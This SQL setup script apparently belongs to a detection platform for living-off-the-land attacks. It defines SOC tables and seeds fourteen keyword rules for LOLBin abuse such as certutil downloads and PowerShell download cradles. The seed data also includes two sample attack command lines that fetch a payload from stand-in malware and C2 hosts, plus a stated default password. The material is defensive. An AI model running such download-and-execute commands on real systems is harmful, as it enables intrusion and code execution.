-- SOCflow Database Initialization
-- LotL Attack Detection Platform

CREATE DATABASE IF NOT EXISTS soc_dfms;
USE soc_dfms;

-- 1) soc_role
CREATE TABLE soc_role (
    role_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    role_name VARCHAR(30) UNIQUE NOT NULL,
    description VARCHAR(255) NULL
) ENGINE=InnoDB;

-- 2) soc_login
CREATE TABLE soc_login (
    login_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    role_id BIGINT UNSIGNED NOT NULL,
    full_name VARCHAR(120) NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    phone VARCHAR(30) NULL,
    password_hash VARCHAR(255) NOT NULL,
    status VARCHAR(10) NOT NULL CHECK (status IN ('active', 'inactive')),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_login DATETIME NULL,
    FOREIGN KEY (role_id) REFERENCES soc_role(role_id)
) ENGINE=InnoDB;

-- 3) soc_host
CREATE TABLE soc_host (
    host_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    asset_name VARCHAR(120) NULL,
    hostname VARCHAR(120) UNIQUE NOT NULL,
    ip_address VARCHAR(45) NULL,
    os_name VARCHAR(80) NULL,
    os_version VARCHAR(80) NULL,
    environment VARCHAR(10) NOT NULL DEFAULT 'lab' CHECK (environment IN ('lab', 'prod')),
    criticality VARCHAR(10) NOT NULL DEFAULT 'medium' CHECK (criticality IN ('low', 'medium', 'high')),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_seen DATETIME NULL,
    status VARCHAR(15) NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'inactive', 'isolated'))
) ENGINE=InnoDB;

-- 4) soc_agent
CREATE TABLE soc_agent (
    agent_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    host_id BIGINT UNSIGNED NOT NULL,
    agent_uuid CHAR(36) UNIQUE NOT NULL,
    agent_name VARCHAR(80) NOT NULL,
    agent_version VARCHAR(40) NULL,
    status VARCHAR(15) NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'inactive')),
    last_seen DATETIME NULL,
    install_time DATETIME NULL,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE
) ENGINE=InnoDB;

-- 5) soc_user_host (Junction)
CREATE TABLE soc_user_host (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT UNSIGNED NOT NULL,
    host_id BIGINT UNSIGNED NOT NULL,
    access_level VARCHAR(10) NOT NULL DEFAULT 'editor' CHECK (access_level IN ('owner', 'editor', 'viewer')),
    UNIQUE KEY unique_user_host (user_id, host_id),
    FOREIGN KEY (user_id) REFERENCES soc_login(login_id) ON DELETE CASCADE,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE
) ENGINE=InnoDB;

-- 6) soc_detection_rule
CREATE TABLE soc_detection_rule (
    rule_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    rule_name VARCHAR(160) UNIQUE NOT NULL,
    description TEXT NULL,
    technique VARCHAR(120) NULL,
    severity_default VARCHAR(10) NOT NULL CHECK (severity_default IN ('low', 'medium', 'high', 'critical')),
    enabled BOOLEAN NOT NULL DEFAULT TRUE,
    logic_type VARCHAR(10) NOT NULL DEFAULT 'keyword' CHECK (logic_type IN ('regex', 'keyword', 'sigma')),
    rule_content LONGTEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME NULL
) ENGINE=InnoDB;

-- 7) soc_process_event
CREATE TABLE soc_process_event (
    event_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    host_id BIGINT UNSIGNED NOT NULL,
    agent_id BIGINT UNSIGNED NULL,
    provider VARCHAR(20) NOT NULL DEFAULT 'Sysmon' CHECK (provider IN ('Sysmon', 'Security', 'PowerShell')),
    event_type VARCHAR(40) NOT NULL DEFAULT 'ProcessCreate',
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    user_name VARCHAR(120) NULL,
    image_path TEXT NULL,
    process_name VARCHAR(260) NULL,
    command_line TEXT NULL,
    current_directory TEXT NULL,
    pid INT NULL,
    ppid INT NULL,
    parent_image TEXT NULL,
    parent_command_line TEXT NULL,
    hash_sha256 CHAR(64) NULL,
    raw_event JSON NULL,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (agent_id) REFERENCES soc_agent(agent_id) ON DELETE SET NULL
) ENGINE=InnoDB;

-- 8) soc_alert_reference
CREATE TABLE soc_alert_reference (
    alert_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    host_id BIGINT UNSIGNED NOT NULL,
    agent_id BIGINT UNSIGNED NULL,
    event_ref_id BIGINT UNSIGNED NULL,
    rule_id BIGINT UNSIGNED NOT NULL,
    severity VARCHAR(10) NOT NULL CHECK (severity IN ('low', 'medium', 'high', 'critical')),
    description TEXT NULL,
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    status VARCHAR(12) NOT NULL DEFAULT 'new' CHECK (status IN ('new', 'open', 'suppressed', 'closed')),
    confidence_score DECIMAL(5,2) NULL CHECK (confidence_score >= 0 AND confidence_score <= 100),
    detection_source VARCHAR(10) NOT NULL DEFAULT 'rule' CHECK (detection_source IN ('rule', 'ml', 'hybrid')),
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (agent_id) REFERENCES soc_agent(agent_id) ON DELETE SET NULL,
    FOREIGN KEY (event_ref_id) REFERENCES soc_process_event(event_id) ON DELETE SET NULL,
    FOREIGN KEY (rule_id) REFERENCES soc_detection_rule(rule_id)
) ENGINE=InnoDB;

-- 9) soc_case
CREATE TABLE soc_case (
    case_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(200) NOT NULL,
    description TEXT NULL,
    priority VARCHAR(10) NOT NULL DEFAULT 'medium' CHECK (priority IN ('low', 'medium', 'high', 'critical')),
    status VARCHAR(12) NOT NULL DEFAULT 'open' CHECK (status IN ('open', 'in_progress', 'closed')),
    created_by BIGINT UNSIGNED NOT NULL,
    assigned_to BIGINT UNSIGNED NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    closed_at DATETIME NULL,
    FOREIGN KEY (created_by) REFERENCES soc_login(login_id),
    FOREIGN KEY (assigned_to) REFERENCES soc_login(login_id) ON DELETE SET NULL
) ENGINE=InnoDB;

-- 10) soc_case_alerts (Junction)
CREATE TABLE soc_case_alerts (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    case_id BIGINT UNSIGNED NOT NULL,
    alert_id BIGINT UNSIGNED NOT NULL,
    added_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY unique_case_alert (case_id, alert_id),
    FOREIGN KEY (case_id) REFERENCES soc_case(case_id) ON DELETE CASCADE,
    FOREIGN KEY (alert_id) REFERENCES soc_alert_reference(alert_id) ON DELETE CASCADE
) ENGINE=InnoDB;

-- 11) soc_case_note
CREATE TABLE soc_case_note (
    note_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    case_id BIGINT UNSIGNED NOT NULL,
    author_id BIGINT UNSIGNED NULL,
    note_text TEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (case_id) REFERENCES soc_case(case_id) ON DELETE CASCADE,
    FOREIGN KEY (author_id) REFERENCES soc_login(login_id) ON DELETE SET NULL
) ENGINE=InnoDB;

-- 12) soc_acknowledgement
CREATE TABLE soc_acknowledgement (
    ack_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    alert_id BIGINT UNSIGNED NOT NULL,
    user_id BIGINT UNSIGNED NOT NULL,
    ack_status VARCHAR(15) NOT NULL CHECK (ack_status IN ('acknowledged', 'ignored', 'false_positive')),
    note TEXT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY unique_alert_ack (alert_id, user_id),
    FOREIGN KEY (alert_id) REFERENCES soc_alert_reference(alert_id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES soc_login(login_id) ON DELETE CASCADE
) ENGINE=InnoDB;

-- 13) soc_forensic_artifact
CREATE TABLE soc_forensic_artifact (
    artifact_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    case_id BIGINT UNSIGNED NULL,
    alert_id BIGINT UNSIGNED NULL,
    host_id BIGINT UNSIGNED NOT NULL,
    artifact_type VARCHAR(60) NOT NULL,
    file_path TEXT NOT NULL,
    hash_sha256 CHAR(64) NULL,
    collected_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    collected_by BIGINT UNSIGNED NULL,
    notes TEXT NULL,
    FOREIGN KEY (case_id) REFERENCES soc_case(case_id) ON DELETE SET NULL,
    FOREIGN KEY (alert_id) REFERENCES soc_alert_reference(alert_id) ON DELETE SET NULL,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (collected_by) REFERENCES soc_login(login_id) ON DELETE SET NULL
) ENGINE=InnoDB;

-- 14) soc_report
CREATE TABLE soc_report (
    report_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    generated_by BIGINT UNSIGNED NOT NULL,
    report_type VARCHAR(20) NOT NULL CHECK (report_type IN ('daily', 'weekly', 'case_report', 'alert_summary')),
    period_start DATE NULL,
    period_end DATE NULL,
    file_path TEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (generated_by) REFERENCES soc_login(login_id)
) ENGINE=InnoDB;

-- 15) soc_audit_log
CREATE TABLE soc_audit_log (
    audit_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT UNSIGNED NULL,
    action_type VARCHAR(40) NOT NULL,
    object_type VARCHAR(40) NULL,
    object_id BIGINT UNSIGNED NULL,
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45) NULL,
    details JSON NULL,
    FOREIGN KEY (user_id) REFERENCES soc_login(login_id) ON DELETE SET NULL
) ENGINE=InnoDB;


-- Indexes
CREATE INDEX idx_process_host_time   ON soc_process_event(host_id, timestamp);
CREATE INDEX idx_alert_status_time   ON soc_alert_reference(status, timestamp);
CREATE INDEX idx_case_status_created ON soc_case(status, created_at);
CREATE INDEX idx_case_alerts_case    ON soc_case_alerts(case_id);
CREATE INDEX idx_case_alerts_alert   ON soc_case_alerts(alert_id);
CREATE INDEX idx_audit_user_time     ON soc_audit_log(user_id, timestamp);


-- Seed Data

-- Roles (2 only: Manager, Analyst)
INSERT INTO soc_role (role_name, description) VALUES
('Manager', 'System manager: enroll endpoints, manage users, configure detection rules'),
('Analyst', 'SOC analyst: alerts, cases, log queries, forensic investigations');

-- Users (passwords are placeholder — server.js rehashes to SOCflow2026! on first startup)
INSERT INTO soc_login (role_id, full_name, email, phone, password_hash, status) VALUES
(1, 'SOC Manager',  'manager@socflow.local', '555-0101', 'SEED_PENDING', 'active'),
(2, 'SOC Analyst',  'analyst@socflow.local', '555-0102', 'SEED_PENDING', 'active');

-- Sample Hosts
INSERT INTO soc_host (asset_name, hostname, ip_address, os_name, os_version, environment, criticality, status) VALUES
('Finance Server',   'FIN-SRV-01',  '192.168.1.10', 'Windows Server 2019', '1809', 'prod', 'high',   'active'),
('Dev Workstation',  'DEV-WKST-04', '192.168.1.55', 'Windows 10',          '21H2', 'lab',  'low',    'active');

-- Sample Agents
INSERT INTO soc_agent (host_id, agent_uuid, agent_name, agent_version, status, last_seen, install_time) VALUES
(1, '550e8400-e29b-41d4-a716-446655440000', 'SOCflow-Agent-Win', '2.0.0', 'active', NOW(), NOW()),
(2, '550e8400-e29b-41d4-a716-446655440001', 'SOCflow-Agent-Win', '2.0.0', 'active', NOW(), NOW());

-- User-Host Access
INSERT INTO soc_user_host (user_id, host_id, access_level) VALUES
(2, 1, 'editor'),
(2, 2, 'viewer');

-- Detection Rules: 14 LOLBin signatures
INSERT INTO soc_detection_rule (rule_name, description, technique, severity_default, logic_type, rule_content) VALUES
('CertUtil File Download',
 'Detects certutil.exe abused as a downloader using -urlcache or -split flags (T1105 - Ingress Tool Transfer)',
 'T1105', 'high', 'keyword',
 'process_name:certutil AND command_line_any:urlcache|-urlcache|split'),

('CertUtil Decode',
 'Detects certutil.exe used to decode obfuscated files via -decode flag (T1140 - Deobfuscate/Decode)',
 'T1140', 'medium', 'keyword',
 'process_name:certutil AND command_line_any:-decode|/decode'),

('PowerShell Encoded Command',
 'Detects PowerShell executing Base64-encoded commands via -enc or -encodedcommand (T1059.001)',
 'T1059.001', 'high', 'keyword',
 'process_name:powershell AND command_line_any:-enc|-encodedcommand'),

('PowerShell Download Cradle',
 'Detects PowerShell downloading and executing remote content in-memory (T1059.001 fileless delivery)',
 'T1059.001', 'critical', 'keyword',
 'process_name:powershell AND command_line_any:downloadstring|downloadfile|webclient|invoke-webrequest|iwr'),

('PowerShell Execution Bypass',
 'Detects PowerShell invoked with security-bypass flags to evade policy controls (T1059.001)',
 'T1059.001', 'high', 'keyword',
 'process_name:powershell AND command_line_any:bypass|-nop|-windowstyle hidden|-noninteractive'),

('MSHTA Remote Execution',
 'Detects MSHTA loading remote HTA content or executing inline scripts (T1218.005 - Signed Binary Proxy)',
 'T1218.005', 'critical', 'keyword',
 'process_name:mshta AND command_line_any:http://|https://|javascript:|vbscript:'),

('Regsvr32 COM Scriptlet (Squiblydoo)',
 'Detects regsvr32 used to execute remote COM scriptlets, bypassing AppLocker (T1218.010)',
 'T1218.010', 'critical', 'keyword',
 'process_name:regsvr32 AND command_line_any:scrobj.dll|http://|https://|/u|/i:'),

('WMIC Process Creation',
 'Detects WMIC used to create or manage processes remotely (T1047 - WMI)',
 'T1047', 'high', 'keyword',
 'process_name:wmic AND command_line_any:process call create|/node:|shadowcopy|/format:'),

('Msiexec Remote Package Install',
 'Detects msiexec silently installing packages from remote URLs (T1218.007)',
 'T1218.007', 'high', 'keyword',
 'process_name:msiexec AND command_line_any:http://|https://|/q|/quiet|/i'),

('Rundll32 Script Execution',
 'Detects rundll32 executing scripts or loading DLLs from unusual locations (T1218.011)',
 'T1218.011', 'high', 'keyword',
 'process_name:rundll32 AND command_line_any:javascript:|http://|shell32|advpack|url.dll'),

('BITSAdmin File Transfer',
 'Detects bitsadmin used to transfer files via BITS jobs, evading network monitoring (T1197)',
 'T1197', 'high', 'keyword',
 'process_name:bitsadmin AND command_line_any:/transfer|/addfile|/download|/upload'),

('Scheduled Task Persistence',
 'Detects schtasks creating scheduled tasks for persistence or execution (T1053.005)',
 'T1053.005', 'medium', 'keyword',
 'process_name:schtasks AND command_line_any:/create|/sc|/tr|/ru'),

('Net User Account Manipulation',
 'Detects net.exe adding users or modifying local administrator group membership (T1136, T1087)',
 'T1136', 'high', 'keyword',
 'process_name:net AND command_line_any:user /add|localgroup administrators'),

('WScript Remote Script Execution',
 'Detects WScript/CScript loading remote scripts or specifying a script engine explicitly (T1059.005)',
 'T1059.005', 'high', 'keyword',
 'process_name:wscript|cscript AND command_line_any:http://|https://|.vbs|/e:vbscript|/e:javascript');

-- Sample Process Events (triggers detection on first engine poll)
INSERT INTO soc_process_event (host_id, agent_id, provider, event_type, timestamp, user_name, process_name, command_line) VALUES
(1, 1, 'Sysmon', 'ProcessCreate', NOW(), 'SYSTEM',
 'certutil.exe',
 'certutil.exe -urlcache -split -f http://malware.example.com/payload.exe C:\\Windows\\Temp\\payload.exe'),
(2, 2, 'Sysmon', 'ProcessCreate', NOW(), 'User1',
 'powershell.exe',
 'powershell.exe -enc ZWNobyAiSGFja2VkIjsgSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MydGVzdC5leGFtcGxlLmNvbS9ydW4ucHMx');

-- Audit Log
INSERT INTO soc_audit_log (user_id, action_type, object_type, object_id, details) VALUES
(1, 'SYSTEM_INIT', 'SYSTEM', NULL, '{"message": "SOCflow database initialized"}');
